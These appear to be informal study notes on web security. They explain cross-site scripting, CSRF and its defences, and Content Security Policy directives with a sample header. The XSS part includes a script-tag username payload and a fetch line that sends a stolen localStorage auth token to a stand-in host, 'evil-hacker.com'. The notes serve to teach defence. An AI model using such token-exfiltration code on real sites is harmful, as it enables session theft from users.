SECURITY::
XSS: Cross site scripting: The attacker is effectively saying to the browser: "Hey, run my code on this trusted website."
XSS usually occurs when a website takes user-provided input (like a comment, a search query, or a user profile name) and displays it on the page without properly sanitizing it.
document.getElementById('welcome-message').innerHTML = 'Welcome, ' + username;
username: MaliciousUser: <script>/* evil code here */</script>

the code can run 
localStorage.getItem('user_auth_token')	
sessionStorage.getItem('cart_id')	
The script reads document cookies that lack the HttpOnly flag.	

const stolenToken = localStorage.getItem('user_auth_token');
fetch('https://evil-hacker.com/steal?token=' + stolenToken); 

cross-Site Request Forgery (CSRF)

On your website you click something and something unexpected unintented happens. 
How it happens? the forged request will carry the cookies from browser to server for authentication and say delete request. 
Server will verify the cookies and delete the account.

Mechanism: An attacker tricks a logged-in user's browser into sending an unintended, authenticated request (e.g., a money transfer) to a trusted site. The browser automatically attaches the user's session cookie.

Primary Defense:

CSRF Token: Requiring a unique, unguessable token (in the form body/header) that a cross-site attacker cannot read due to SOP.

SameSite=Lax/Strict Cookie Attribute: Prevents the browser from attaching the session cookie to cross-site requests in the first place.


What is Content Security Policy (CSP)? 🛡️
Content Security Policy (CSP) is an added layer of security that helps mitigate several types of attacks, including Cross-Site Scripting (XSS) and data injection.

In essence, CSP is a set of HTTP response headers that you configure on your web server (or application backend) to tell the browser which sources of content are trusted and allowed to load or execute on your page.

How CSP Works
The browser reads the CSP header and strictly enforces the rules defined within it. If a resource (like a script, an image, or an iframe) attempts to load from an unapproved source, the browser will block it.

Directive	Purpose	Example (Food App)
default-src	Fallback for any resource type not explicitly listed.	default-src 'self' (Only load resources from our own domain)
script-src	Specifies valid sources for JavaScript files.	script-src 'self' https://maps.googleapis.com (Only allow scripts from our domain and Google Maps)
img-src	Specifies valid sources for images.	img-src 'self' https://cdn.food-app.com data: (Allow images from our domain, our CDN, and inline data URIs)
frame-ancestors	Clickjacking Defense. Specifies which sources can embed the page in an iframe, object, or embed tag.	frame-ancestors 'none' (Prevent all framing)
Content-Security-Policy: default-src 'self'; 
                         script-src 'self' https://checkout.stripe.com; 
                         frame-ancestors 'none';
                         object-src 'none';
